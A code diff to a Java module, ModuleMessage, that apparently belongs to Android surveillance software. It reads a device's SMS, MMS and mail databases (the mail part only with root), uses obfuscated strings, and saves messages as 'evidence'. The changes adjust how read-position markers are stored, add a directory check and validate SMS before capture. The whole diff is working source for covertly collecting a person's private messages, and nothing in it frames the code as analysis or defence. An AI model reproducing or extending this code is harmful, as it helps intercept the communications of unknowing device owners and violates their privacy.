@@ -118,7 +118,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
 
-	
 			mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, M.e("mail"), conf, config);
 			smsEnabled = readJson(ID_SMS, M.e("sms"), conf, config);
 			mmsEnabled = readJson(ID_MMS, M.e("mms"), conf, config);
@@ -292,33 +291,17 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	private void initMail() {
 		lastMail = storedMAIL.unserialize(new Hashtable<String, Integer>());
-		if(Cfg.ONE_MAIL){
-			lastMail.put("mailstore.proc.test@gmail.com.db", 3886);
-		}
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (initMail), read lastMail: " + lastMail);
 		}
 	}
 
 	private void initSms() {
-		if (storedSMS.isMarkup()) {
-			try {
-				lastSMS = (Integer) storedSMS.readMarkupSerializable();
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (initSms): lastSMS: " + lastSMS);
-				}
-			} catch (Exception e) {
-				storedSMS.removeMarkup();
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart) Error reading markup: " + e);
-				}
-			}
+		lastSMS = storedSMS.unserialize(new Integer(0));
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (initSms): lastSMS: " + lastSMS);
 		}
 
-		/*
-		 * if (!storedSMS.isMarkup()) { int lastSMS = readHistoricSms();
-		 * storedSMS.createEmptyMarkup(); }
-		 */
 	}
 
 	private void initMms() {
@@ -351,17 +334,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	}
 
 	public synchronized void updateMarkupSMS(int value) {
-		try {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (updateMarkupSMS): " + value);
-			}
-			lastSMS = value;
-			storedSMS.writeMarkupSerializable(new Integer(value));
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (updateMarkupSMS) Error: " + e);
-			}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (updateMarkupSMS): " + value);
 		}
+		storedSMS.serialize(value);
+		lastSMS = value;
 	}
 
 	public void updateMarkupMail(String mailstore, int newLastId, boolean serialize) {
@@ -400,6 +377,13 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				return fileName.endsWith(".db") && fileName.startsWith(M.e("mailstore."));
 			}
 		};
+		
+		if(!dir.exists()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getMailStores) Error: no dir");
+			}
+			return new String[]{};
+		}
 
 		FilenameFilter filterall = new FilenameFilter() {
 			public boolean accept(File directory, String fileName) {
@@ -444,7 +428,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 					// i_2=messages
 					// M.d("messages")
 					int newLastId = (int) helper.traverseRecords("messages", visitor);
-					
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readHistoricMail) finished, newLastId: " + newLastId);
 					}
@@ -526,7 +510,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		final long date = sms.getDate();
 		final boolean sent = sms.getSent();
 
-		saveEvidenceSms(address, body, date, sent);
+		if (sms.isValid()) {
+			saveEvidenceSms(address, body, date, sent);
+		}
 	}
 
 	private void saveMms(Mms mms) {
